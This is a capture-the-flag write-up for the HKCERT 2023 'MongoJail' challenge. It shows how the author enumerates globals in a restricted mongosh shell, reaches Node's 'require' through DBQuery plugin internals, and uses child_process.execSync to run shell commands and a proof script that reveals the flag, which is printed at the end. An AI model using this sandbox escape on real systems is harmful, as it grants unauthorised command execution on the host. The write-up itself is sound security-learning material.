Another challenge with some hints in a step-by-step: https://hackmd.io/@blackb6a/hkcert-ctf-2023-ii-en-4e6150a89a1ff32c#%E7%8D%84%E9%96%80%E7%96%86--MongoJail-Pwn

We have the JS documentation (which is valid in Mongo): https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference

Object doesn't seem to be set to none, haha

https://stackoverflow.com/questions/1880198/how-to-execute-shell-commands-in-javascript

var execSync = require('child_process').execSync; execSync('ls', { encoding: 'utf-8' });

Object.getOwnPropertyNames(Object.prototype)

Object.getOwnPropertyNames(this).filter((obj) => obj !== undefined)
[
  'global',
  'clearImmediate',
  'setImmediate',
  'clearInterval',
  'clearTimeout',
  'setInterval',
  'setTimeout',
  'queueMicrotask',
  'structuredClone',
  'atob',
  'btoa',
  'performance',
  'fetch',
  '_',
  '@@@mdb.signatures@@@',
  'Date',
  'crypto',
  'DBQuery',
  'config',
  'use',
  'show',
  'exit',
  'quit',
  'Mongo',
  'connect',
  'it',
  'version',
  'load',
  'enableTelemetry',
  'disableTelemetry',
  'passwordPrompt',
  'sleep',
  '_print',
  'print',
  'printjson',
  'convertShardKeyToHashed',
  'cls',
  'isInteractive',
  'help',
  'DBRef',
  'bsonsize',
  'MaxKey',
  'MinKey',
  'ObjectId',
  'Timestamp',
  'Code',
  'NumberDecimal',
  'NumberInt',
  'NumberLong',
  'ISODate',
  'BinData',
  'HexData',
  'UUID',
  'MD5',
  'Decimal128',
  'BSONSymbol',
  'Int32',
  'Long',
  'Binary',
  'Double',
  'BSONRegExp',
  'EJSON',
  'rs',
  'sh',
  'sp',
  'buildInfo',
  'snippet',
  'edit',
  '_slicedToArray',
  '_nonIterableRest',
  '_unsupportedIterableToArray',
  '_arrayLikeToArray',
  '_iterableToArrayLimit',
  '_arrayWithHoles',
  'MongoshAsyncWriterError',
  'TypedArray',
  'origArraySort',
  'origTypedArraySort',
  'origFptS',
  'Object',
  'Function',
  'Array',
  'Number',
  'parseFloat',
  'parseInt',
  'Infinity',
  'NaN',
  'undefined',
  'Boolean',
  'String',
  'Symbol',
  'Promise',
  'RegExp',
  'Error',
  'AggregateError',
  'EvalError',
  'RangeError',
  'ReferenceError',
  'SyntaxError',
  'TypeError',
  'URIError',
  'globalThis',
  'JSON',
  'Math',
  'Intl',
  'ArrayBuffer',
  'Uint8Array',
  'Int8Array',
  'Uint16Array',
  'Int16Array',
  'Uint32Array',
  'Int32Array',
  'Float32Array',
  'Float64Array',
  'Uint8ClampedArray',
  'BigUint64Array',
  'BigInt64Array',
  'DataView',
  'Map',
  'BigInt',
  'Set',
  'WeakMap',
  'WeakSet',
  'Proxy',
  'Reflect',
  'FinalizationRegistry',
  'WeakRef',
  'decodeURI',
  'decodeURIComponent',
  'encodeURI',
  'encodeURIComponent',
  'escape',
  'unescape',
  'eval',
  'isFinite',
  'isNaN',
  'console',
  'SharedArrayBuffer',
  'Atomics',
  'WebAssembly'
]

Now we can run the following and see what options they have - we are looking for something which holds a reference to "require".

`this.global` - It seems that DBQuery has a reference, let's get it!

`this.global.DBQuery._instanceState.plugins[1].require()`

And now we can run this to get ls:

`var execSync = this.global.DBQuery._instanceState.plugins[1].require('child_process').execSync; execSync('ls', { encoding: 'utf-8' });`

__pycache__
chall.py
venv

`var execSync = this.global.DBQuery._instanceState.plugins[1].require('child_process').execSync; execSync('ls ../../', { encoding: 'utf-8' });`

proof_CBg0IiyEoIHTxFLZEaB4mKma9TlC1UmFCsVdnyuH.sh


`var execSync = this.global.DBQuery._instanceState.plugins[1].require('child_process').execSync; execSync('../../proof_CBg0IiyEoIHTxFLZEaB4mKma9TlC1UmFCsVdnyuH.sh', { encoding: 'utf-8' });`

And then we get the flag:

hkcert23{WolframAlpha_L0v3z_Shibuya-Yuri_Harajuku-Furi}